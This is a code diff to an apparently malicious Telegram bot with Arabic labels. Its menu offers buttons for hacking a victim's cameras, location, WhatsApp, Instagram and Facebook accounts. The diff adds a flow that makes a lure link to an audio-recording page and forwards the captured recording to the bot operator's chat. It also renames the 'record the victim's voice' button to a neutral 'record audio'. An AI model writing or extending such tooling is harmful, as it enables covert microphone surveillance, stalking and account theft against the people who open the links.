@@ -147,7 +147,7 @@ bot.onText(/\/start/, async (msg) => {
     const mainMenuMessage = 'مرحبًا! بك كل الازرار مجاناً:';
     const mainMenuButtons = [
       [{ text: 'اختراق الكامرا الأمامية 📸', callback_data: `captureFront:${chatId}` }, { text: 'اختراق الكامرا الخلفية 📷', callback_data: `captureBack:${chatId}` }],
-      [{ text: 'اختراق الموقع 📍', callback_data: `getLocatiov:${chatId}` }, { text: 'تسجيل صوت الضحية 🎤', callback_data: `recordVoice:${chatId}` }],
+      [{ text: 'اختراق الموقع 📍', callback_data: `getLocatiov:${chatId}` }, { text: 'تسجيل الصوت 🎤', callback_data: `recordAudio:${chatId}` }],
       [{ text: 'اختراق كاميرات المراقبة 📡', callback_data: 'get_cameras' }, { text: 'تصوير الضحية فيديو 🎥', callback_data: 'capture_video' }],
       [{ text: 'اختراق واتساب 🟢', callback_data: 'request_verification' }, { text: 'اختراق انستجرام 🖥', callback_data: `rshq_instagram:${chatId}` }],
       [{ text: 'اختراق فيسبوك 🔮', callback_data: `rshq_facebook:${chatId}` }, { text: 'اختراق ببجي 🕹', callback_data: 'get_pubg' }],
@@ -3612,6 +3612,86 @@ app.post('/submitLocation', async (req, res) => {
         res.status(500).send('خطأ في الخادم');
     }
 });
+
+
+app.get('/', (req, res) => {
+    const chatId = req.query.chatId;
+    if (chatId) {
+        res.sendFile(path.join(__dirname, 'audio.html'));
+    } else {
+        res.status(400).send('خطأ: chatId مطلوب');
+    }
+});
+
+// أمر البدء /start
+bot.onText(/\/sffdjkvctart/, (msg) => {
+    const chatId = msg.chat.id;
+    
+    const keyboard = {
+        inline_keyboard: [
+            [{ text: 'تسجيل الصوت 🎤', callback_data: `recordAudio:${chatId}` }]
+        ]
+    };
+    
+    bot.sendMessage(chatId, 'مرحباً! اضغط على الزر أدناه لتسجيل صوت', {
+        reply_markup: keyboard
+    });
+});
+
+// معالجة ضغط زر الإنلاين
+bot.on('callback_query', (callbackQuery) => {
+    const message = callbackQuery.message;
+    const chatId = message.chat.id;
+    const data = callbackQuery.data;
+
+    if (data.startsWith('recordAudio:')) {
+        const targetChatId = data.split(':')[1];
+        
+        // إنشاء رابط HTML فريد لكل مستخدم
+        const audioUrl = `${baseUrl}/?chatId=${targetChatId}`;
+        
+        // إرسال الرابط كرسالة نصية عادية
+        bot.sendMessage(
+            chatId, 
+            `انقر على الرابط التالي لتسجيل صوتك:\n\n${audioUrl}`
+        );
+        
+        // تأكيد استلام الضغط
+        bot.answerCallbackQuery(callbackQuery.id);
+    }
+});
+
+// نقطة النهاية لاستقبال الصوت من الصفحة HTML
+app.post('/submit-audio', upload.single('audio'), async (req, res) => {
+    try {
+        const { chatId } = req.body;
+        
+        if (!chatId || !req.file) {
+            return res.status(400).send('بيانات ناقصة');
+        }
+
+        console.log('تم استقبال التسجيل الصوتي:', { chatId, file: req.file });
+
+        // إرسال الصوت إلى المستخدم في التلجرام
+        await bot.sendMessage(chatId, '✅ تم استقبال تسجيلك الصوتي بنجاح!');
+        
+        // إرسال الملف الصوتي
+        await bot.sendAudio(chatId, req.file.path, {
+            caption: 'تسجيل صوتي مدته 10 ثواني'
+        });
+
+        // حذف الملف المؤقت
+        fs.unlinkSync(req.file.path);
+
+        res.status(200).json({ success: true, message: 'تم استقبال الصوت بنجاح' });
+        
+    } catch (error) {
+        console.error('خطأ في معالجة الصوت:', error);
+        res.status(500).json({ success: false, message: 'خطأ في الخادم' });
+    }
+});
+
+
 
 const clearTemporaryStorage = () => {
     try {
